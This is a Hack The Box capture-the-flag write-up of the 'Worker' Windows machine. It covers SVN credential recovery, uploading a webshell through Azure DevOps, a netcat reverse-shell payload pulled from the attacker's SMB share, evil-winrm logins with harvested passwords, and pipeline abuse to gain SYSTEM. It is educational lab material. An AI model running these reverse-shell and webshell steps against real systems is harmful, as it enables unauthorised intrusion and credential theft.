---
layout: post
title: "Hack The Box - Worker Writeup"
author: Chr0x6eOs
date: "2021-01-30"
subject: "Worker Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Windows, SVN, Azure, DevOps, PowerShell, aspx]
lang: "en"
image:
    path: assets/htb/Worker/logo.png
    width: 300
    height: 300
...

![Worker](/assets/htb/Worker/worker.png)

[Worker](https://www.hackthebox.eu/home/machines/profile/270) is a medium windows box by [ekenas](https://app.hackthebox.eu/users/222808).

### Overview

The box starts with svn-enumeration, where we find two VHosts, as well as a set of credentials. After the SVN enumeration, we enumerate the two VHosts. One of the VHost is only serving static-pages. The other VHost prompts us with a http-auth prompt. Using the found credentials, we successfully login to Azure DevOps. Using our privileges on the website, we can upload a webshell to the template-repository. Uploading the webshell gives as code-execution and we can get a shell.

Enumerating the system, we can find an addition drive, which contains a file with a lot of credentials. One of these sets words for a system user, which we can use to get a shell using evil-winrm and read user.txt.

In order to get root, we have to exploit the Azure Devops pipelines. For this we have to create a new pipeline and specify to run a PowerShell script. The script was uploaded previously to one of the repositories. Saving and queueing the script, we successfully execute the PowerShell-payload and get code-execution as nt authority\system, which allows us to read root.txt.

## Information Gathering

### Nmap 
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.203
Nmap scan report for 10.10.10.203
Host is up (0.080s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration

The only open ports shown are **80** (http) and **3690** (svn). SVN seems very interesting, so let us start our enumeration there.

### SVN - Port 3690

Let us start by getting some information about the svn repository.

```bash
root@darkness:~# svn info svn://10.10.10.203:3690/
Path: .
URL: svn://10.10.10.203
Relative URL: ^/
Repository Root: svn://10.10.10.203
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: 5
Node Kind: directory
Last Changed Author: nathen
Last Changed Rev: 5
Last Changed Date: 2020-06-20 15:52:00 +0200 (Sat, 20 Jun 2020)
```

Seems like we are able to connect to the server without any issues. Let us try to access which files are available.

```bash
root@darkness:~# svn list svn://10.10.10.203:3690/
dimension.worker.htb/
moved.txt
```

We have a .txt file and a directory. This gives us the domain `worker.htb` and a virtual-host `dimension`. Let us sync the svn to our local host and analyze it further.

```bash
root@darkness:~# svn checkout svn://10.10.10.203:3690/
A    dimension.worker.htb                                  
A    dimension.worker.htb/LICENSE.txt       
A    dimension.worker.htb/README.txt      
A    dimension.worker.htb/assets          
A    dimension.worker.htb/assets/css      
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
A    dimension.worker.htb/assets/css/main.css
A    dimension.worker.htb/assets/css/noscript.css
A    dimension.worker.htb/assets/js
A    dimension.worker.htb/assets/js/breakpoints.min.js
A    dimension.worker.htb/assets/js/browser.min.js
A    dimension.worker.htb/assets/js/jquery.min.js
A    dimension.worker.htb/assets/js/main.js
A    dimension.worker.htb/assets/js/util.js
A    dimension.worker.htb/assets/sass
A    dimension.worker.htb/assets/sass/base
A    dimension.worker.htb/assets/sass/base/_page.scss
A    dimension.worker.htb/assets/sass/base/_reset.scss
A    dimension.worker.htb/assets/sass/base/_typography.scss 
A    dimension.worker.htb/assets/sass/components
A    dimension.worker.htb/assets/sass/components/_actions.scss
A    dimension.worker.htb/assets/sass/components/_box.scss
A    dimension.worker.htb/assets/sass/components/_button.scss
A    dimension.worker.htb/assets/sass/components/_form.scss 
A    dimension.worker.htb/assets/sass/components/_icon.scss 
A    dimension.worker.htb/assets/sass/components/_icons.scss
A    dimension.worker.htb/assets/sass/components/_image.scss
A    dimension.worker.htb/assets/sass/components/_list.scss 
A    dimension.worker.htb/assets/sass/components/_table.scss
A    dimension.worker.htb/assets/sass/layout
A    dimension.worker.htb/assets/sass/layout/_bg.scss
A    dimension.worker.htb/assets/sass/layout/_footer.scss
A    dimension.worker.htb/assets/sass/layout/_header.scss
A    dimension.worker.htb/assets/sass/layout/_main.scss
A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
A    dimension.worker.htb/assets/sass/libs
A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
A    dimension.worker.htb/assets/sass/libs/_functions.scss
A    dimension.worker.htb/assets/sass/libs/_mixins.scss
A    dimension.worker.htb/assets/sass/libs/_vars.scss
A    dimension.worker.htb/assets/sass/libs/_vendor.scss
A    dimension.worker.htb/assets/sass/main.scss
A    dimension.worker.htb/assets/sass/noscript.scss
A    dimension.worker.htb/assets/webfonts
A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot 
A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg 
A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf 
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff 
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    dimension.worker.htb/images
A    dimension.worker.htb/images/bg.jpg
A    dimension.worker.htb/images/overlay.png
A    dimension.worker.htb/images/pic01.jpg
A    dimension.worker.htb/images/pic02.jpg
A    dimension.worker.htb/images/pic03.jpg
A    dimension.worker.htb/index.html
A    moved.txt
Checked out revision 5.
```

Now that we have dumped the repository, let check out the repository for interesting files.

```bash
root@darkness:~# cat moved.txt 
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

The moved.txt file gives us another VHost: `devops`. Let us add these hosts to our `/etc/hosts` file.

```bash
root@darkness:~# cat /etc/hosts | tail -n 1
10.10.10.203    worker.htb dimension.worker.htb devops.worker.htb
```

Let us use `svn diff` to see any interesting changes:

```bash
root@darkness:~# svn diff -c 3
Index: deploy.ps1
===================================================================
--- deploy.ps1  (revision 2)
+++ deploy.ps1  (revision 3)
@@ -1,6 +1,7 @@
 $user = "nathen" 
-$plain = "wendel98"
+# NOTE: We cant have my password here!!!
+$plain = ""
 $pwd = ($plain | ConvertTo-SecureString)
 $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
 $args = "Copy-Site.ps1"
-Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
\ No newline at end of file
```

The `deploy.ps1` script contains credentials for the user `nathen`! Let us save these credentials for later (`nathen`:`wendel98`).

Now that we have enumerated svn, let us continue our enumeration and check out http.

### HTTP - Port 80

We have two VHosts to enumerate:

- dimension.worker.htb
- devops.worker.htb

Let us start with `dimension.worker.htb`.

#### Dimension VHost

Going to http://dimension.worker.htb, we get following webpage shown:

![Dimension webpages](/assets/htb/Worker/http/dimension-index-webpage.png)

Going to the work tab, we get the following page:

![Work page](/assets/htb/Worker/http/dimension-work-webpage.png)

This page contains links to following pages:

- alpha.worker.htb
- cartoon.worker.htb
- lens.worker.htb
- solid-state.worker.htb
- spectral.worker.htb
- story.worker.htb

These were extracted using this grep command:

```bash
root@darkness:~/dimension.worker.htb# cat index.html | grep -oE "http://.*\.worker\.htb"
http://alpha.worker.htb
http://cartoon.worker.htb
http://lens.worker.htb
http://solid-state.worker.htb
http://spectral.worker.htb
http://story.worker.htb
```

 All of these mentioned pages are simple showcases of web-templates. Taking `alpha.worker.htb` as example:

![Alpha webpage](/assets/htb/Worker/http/alpha-index-webpage.png)



As these web-pages does not seem to have any interesting information, we can now continue our enumeration on the other VHost.

#### Devops VHost

Going to http://devops.worker.htb, we get a basic-http-auth prompt:

![HTTP Basic auth prompt](/assets/htb/Worker/http/devops-httpauth.png)

Let us try to login using the found credentials: `nathen`:`wendel98`.

![Azure DevOps](/assets/htb/Worker/http/devops-index-webpage.png)

We successfully login and are presented with the web-interface of Azure DevOps.

## Initial Shell - Exploiting Azure DevOps

Now that we have access to Azure DevOps let us start enumerating the web-interface to find a way to get a shell on the server.

### Enumeration

Accessing the SmartHotel360 project, we can go to the Repos tab.

![Repos tab](/assets/htb/Worker/http/devops-repo.png)

We now have access to the repositories of all recently found websites. Let us try to upload a webshell to this repository.

### Uploading the webshell

We can use the `Upload files(s)` menu to add a aspx web-shell. Kali already has a aspx web-shell at this path: `/usr/share/webshells/aspx/cmdasp.aspx`.

![Push failed](/assets/htb/Worker/http/devops-push-failed.png)

However, we are not able to push directly to master. Let us create our own branch, push the file and then try to start a pull-request to the master branch.

![Creating the branch](/assets/htb/Worker/http/devops-create-branch.png)

![Creating the branch 2](/assets/htb/Worker/http/devops-create-branch-2.png)

Now that we have created the branch, let us commit the web-shell.

![Commiting the webshell](/assets/htb/Worker/http/devops-commit-webshell.png)

We now add the web-shell, commit and push it to our branch.

![Web-shell added](/assets/htb/Worker/http/devops-webshell-added.png)

Now that the webshell is added, we can create the pull request.

![Pull request 1](/assets/htb/Worker/http/devops-pull-request.png)

Now we simply have to approve the pull-request ourselves and add a work-item. For the work-item an ID has to be supplied (we can simply use 1).

![Pull request completing](/assets/htb/Worker/http/devops-pull-request-complete.png)

Now we simply have to complete the pull-request by merging the changes.

![Merging the pull-request](/assets/htb/Worker/http/devops-pull-request-complete-1.png)

We can now complete the merge to transfer our web-shell to the master-branch.

![Pull-request merged](/assets/htb/Worker/http/devops-pull-request-completed.png)

The pull-request is completed and we should now see the web-shell in the master branch.

![Web-shell on master-branch](/assets/htb/Worker/http/devops-webshell-master.png)

The web-shell was successfully added to the master branch. 

### Verifying code-execution

Let us now access http://alpha.worker.htb/cmdasp.aspx to verify code-execution.

![Verifying code-execution](/assets/htb/Worker/http/code-execution.png)

We can successfully verify code-execution on the server.

### Getting a shell

We can now host nc via smb and get a reverse-shell. I am going to use my own little bash-script to start a SMB-server docker instance and host netcat. The script can be found on [my GitHub](https://github.com/chr0x6eos/smbserv).

```bash
root@darkness:~# smbserv -f /usr/share/windows-binaries/nc.exe

#####################
# Simple SMB-Server #
#    By Chr0x6eOs   #
#####################

Github: https://github.com/chr0x6eos

About:
A simple SMB-server running in docker.
By default current directory will be served.

[+] Smb-server (ID: 9ac30723656c) started!
[+] DONE! :) Container (ID: 9ac30723656c) is now running and serving...
Your files are available at:
  \\127.0.0.1\share\
  \\10.10.14.2\share\
```

We can now use the web-shell to execute netcat and get a connection back.

![Reverse-shell webshell](/assets/htb/Worker/http/get-shell.png)

We can use the payload: `\\10.10.14.2\share\nc.exe 10.10.14.2 443 -e powershell.exe` to connect to our smb-server use nc.exe to get a reverse-shell.

```bash
root@darkness:~# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.203.
Ncat: Connection from 10.10.10.203:52336.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

We get a reverse-shell as `defaultapppool` and can now start enumerating the system.

## Privesc - User

Now that we have initial shell let us start enumerating the system to find a privesc-vector to get a user shell.

### Enumerating the system

After a lot of searching I eventually tried to list all drives installed.

```powershell
PS C:\> Get-Volume

DriveLetter FriendlyName FileSystemType DriveType HealthStatus OperationalStatus SizeRemaining    Size
----------- ------------ -------------- --------- ------------ ----------------- -------------    ----
C                        NTFS           Fixed     Healthy      OK                      9.72 GB 29.4 GB
W           Work         NTFS           Fixed     Healthy      OK                     17.48 GB   20 GB
            Recovery     NTFS           Fixed     Healthy      OK                    118.04 MB  499 MB
```

There seems to be a drive `W`. Let us check it out.

```powershell
PS W:\> dir

    Directory: W:\
    
Mode                LastWriteTime         Length Name                   
----                -------------         ------ ----                   
d-----       2020-06-16     18:59                agents                 
d-----       2020-03-28     14:57                AzureDevOpsData         
d-----       2020-04-03     11:31                sites                   
d-----       2020-06-20     16:04                svnrepos
```

Let us check out `svnrepos`.

```powershell
PS W:\svnrepos\www\conf> type passwd
type passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```

Looking  at`W:\svnrepos\www\conf` we can find a password file (`passwd`). This contains credentials for one of the system-users (`robisl`:`wolves11`). 

### Getting shell as robisl

We can now use evil-winrm to login as the user.

```powershell
root@darkness:~# evil-winrm -u robisl -p wolves11 -i 10.10.10.203

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\robisl\Documents>
```

We now get a shell and can read user.txt.

```powershell
*Evil-WinRM* PS C:\Users\robisl\Desktop> type user.txt
326e1***************************
```

## Privesc - Root

Now that we have user, let privesc to root using Azure DevOps pipelines.

### Exploiting Azure DevOps pipelines

We can exploit Azure DevOps pipelines to execute any powershell script on the machines.

![Creating a new pipeline](/assets/htb/Worker/root/devops-new-pipeline.png)

Let us begin by creating a new pipeline.

![Selecting classic editor](/assets/htb/Worker/root/devops-new-pipeline-1.png)

Next we specify to use the classic editor.

![Selecting azure repos git](/assets/htb/Worker/root/devops-new-pipeline-2.png)

We specify the Azure Repos Git, where we uploaded a powershell-reverse shell previously (same technique used when exploiting initial shell).

![Creating a empty pipeline](/assets/htb/Worker/root/devops-new-pipeline-3.png)

We create a new empty pipeline.

![Setting up agent pool](/assets/htb/Worker/root/devops-new-pipeline-4.png)

And specify the app-pool to be what is available.

![Adding a PowerShell task](/assets/htb/Worker/root/devops-new-pipeline-5.png)

We now add a powershell task to execute.

![Specifying our reverse-shell (rev.sp1)](/assets/htb/Worker/root/devops-new-pipeline-6.png)

We specify our evil powershell file to be executed (`rev.ps1`).

![Save & queue](/assets/htb/Worker/root/devops-new-pipeline-7.png)

We can now save&queue the pipeline.

![Executing queue](/assets/htb/Worker/root/devops-new-pipeline-8.png)

The rev.ps1 script will now be executed.

![Exploit executed](/assets/htb/Worker/root/devops-exploit-executed.png)

The script successfully executes and we should get a shell.

```powershell
root@darkness:~# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.203.
Ncat: Connection from 10.10.10.203:49948.
Windows PowerShell running as user WORKER$ on WORKER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS W:\agents\agent11\_work\12\s> whoami
nt authority\system
PS W:\agents\agent11\_work\12\s> type C:\Users\Administrator\Desktop\root.txt
51929***************************
```

We get a shell as `nt authority\system` and can read root.txt.